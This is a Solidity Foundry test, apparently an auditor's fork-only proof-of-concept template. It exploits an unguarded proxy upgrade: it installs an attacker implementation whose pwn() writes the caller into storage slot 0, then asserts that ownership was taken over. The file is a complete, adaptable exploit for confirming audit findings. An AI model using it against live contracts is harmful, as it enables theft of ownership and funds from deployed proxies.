// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Storage collision via unguarded upgrade
/// @notice Detectors: storage-gap, unprotected-admin, delegatecall. The
///         proxy's upgrade path is unguarded (or _authorizeUpgrade is
///         unrestricted), so anyone can point the proxy at a malicious
///         implementation whose storage layout collides with the proxy's
///         -- overwriting owner / balances / paused from the new code.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt upgradeTo() to the target's
///      real upgrade entry (upgradeTo / upgradeToAndCall /
///      setImplementation).

contract AttackImpl {
    // Slot 0 in the PROXY's storage (owner in most proxies).
    function pwn() external {
        assembly {
            sstore(0, caller())
        }
    }

    function owner() external view returns (address o) {
        assembly {
            o := sload(0)
        }
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);
        AttackImpl attackImpl = new AttackImpl();

        // Upgrade the proxy to the attacker's implementation -- as ANYONE.
        vm.prank(attackerEOA);
        (bool upOk,) = target.call(
            abi.encodeWithSignature("upgradeTo(address)", address(attackImpl))
        );
        require(upOk, "upgradeTo failed -- upgrade is guarded or entry differs (adapt it)");

        // New implementation code now runs in the proxy's storage.
        vm.prank(attackerEOA);
        (bool pwnOk,) = target.call(abi.encodeWithSignature("pwn()"));
        require(pwnOk, "pwn() on upgraded proxy failed");

        (bool ownerOk, bytes memory ret) =
            target.staticcall(abi.encodeWithSignature("owner()"));
        require(ownerOk, "proxy has no owner() view -- check slot 0 via vm.load");
        address owner_ = abi.decode(ret, (address));
        console.log("proxy owner after collision upgrade:", owner_);
        assertEq(owner_, attackerEOA, "exploit did not reproduce: storage not collided");
    }
}
